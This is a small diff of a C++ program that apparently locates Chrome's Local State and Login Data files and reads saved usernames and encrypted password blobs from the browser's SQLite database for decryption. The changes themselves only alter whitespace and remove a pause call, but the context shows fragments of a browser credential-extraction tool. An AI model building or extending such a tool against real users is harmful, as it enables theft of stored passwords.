@@ -26,7 +26,6 @@ bool IsChromeInstalled() {
   }
 }
 
-
 // Finds the path to the Local State file.
 // This function retrieves the user's profile path and constructs the path to
 // the Local State file used by Google Chrome.
@@ -208,7 +207,6 @@ int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) 
     const unsigned char* usernameValue = sqlite3_column_text(stmt, 1);
     const void* passwordBlob = sqlite3_column_blob(stmt, 2);
     int passwordSize = sqlite3_column_bytes(stmt, 2);
-
     int blacklistedByUser = sqlite3_column_int(stmt, 3);
 
     if (originUrl != NULL && originUrl[0] != '\0' &&
@@ -332,6 +330,7 @@ int main() {
   switch (choice) {
   case 1:
     if (IsChromeInstalled()) {
+
       okay("Google Chrome is installed.");
       std::wstring localStatePath = FindLocalState();
       std::wstring loginDataPath = FindLoginData();
@@ -356,7 +355,6 @@ int main() {
     break;
   }
 
-  system("pause");
   return EXIT_SUCCESS;
 
 #else
